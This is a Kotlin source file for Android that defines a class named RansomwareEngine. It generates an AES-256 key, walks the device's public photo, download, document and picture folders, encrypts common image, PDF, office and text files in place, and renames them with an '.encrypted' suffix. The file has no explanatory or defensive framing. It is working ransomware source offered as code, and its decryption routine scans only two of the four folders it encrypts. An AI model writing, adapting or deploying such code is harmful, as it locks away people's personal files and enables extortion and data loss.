package com.genetic.system.v3.engine

import android.os.Environment
import java.io.File
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.SecretKey
import javax.crypto.spec.GCMParameterSpec
import java.security.SecureRandom

class RansomwareEngine {
    var encryptedCount = 0
    var totalSize = 0.0
    var encryptionKey = ""
    
    private val keyGenerator = KeyGenerator.getInstance("AES").apply { init(256) }
    private var secretKey: SecretKey = keyGenerator.generateKey()
    private val cipher = Cipher.getInstance("AES/GCM/NoPadding")
    private val gcmSpec = GCMParameterSpec(128, ByteArray(12).apply { SecureRandom().nextBytes(this) })
    
    init {
        encryptionKey = android.util.Base64.encodeToString(secretKey.encoded, android.util.Base64.DEFAULT)
    }
    
    suspend fun encryptAllFiles(onProgress: (Float) -> Unit) {
        val files = getFilesToEncrypt()
        val total = files.size
        files.forEachIndexed { index, file ->
            encryptFile(file)
            encryptedCount++
            onProgress(index.toFloat() / total)
        }
    }
    
    suspend fun decryptAllFiles(onProgress: (Float) -> Unit) {
        val files = getEncryptedFiles()
        val total = files.size
        files.forEachIndexed { index, file ->
            decryptFile(file)
            onProgress(index.toFloat() / total)
        }
    }
    
    private fun getFilesToEncrypt(): List<File> {
        val files = mutableListOf<File>()
        val directories = listOf(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES)
        )
        directories.forEach { dir ->
            dir?.walk()?.forEach { file ->
                if (file.isFile && file.extension in listOf("jpg", "png", "pdf", "doc", "docx", "xls", "xlsx", "txt")) {
                    files.add(file)
                }
            }
        }
        return files
    }
    
    private fun getEncryptedFiles(): List<File> {
        val files = mutableListOf<File>()
        val directories = listOf(
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
        )
        directories.forEach { dir ->
            dir?.walk()?.forEach { file ->
                if (file.isFile && file.extension == "encrypted") {
                    files.add(file)
                }
            }
        }
        return files
    }
    
    private fun encryptFile(file: File) {
        try {
            val data = file.readBytes()
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, gcmSpec)
            val encrypted = cipher.doFinal(data)
            file.writeBytes(encrypted)
            file.renameTo(File(file.absolutePath + ".encrypted"))
            totalSize += file.length() / (1024.0 * 1024.0)
        } catch (e: Exception) { }
    }
    
    private fun decryptFile(file: File) {
        try {
            val data = file.readBytes()
            cipher.init(Cipher.DECRYPT_MODE, secretKey, gcmSpec)
            val decrypted = cipher.doFinal(data)
            file.writeBytes(decrypted)
            file.renameTo(File(file.absolutePath.replace(".encrypted", "")))
        } catch (e: Exception) { }
    }
}
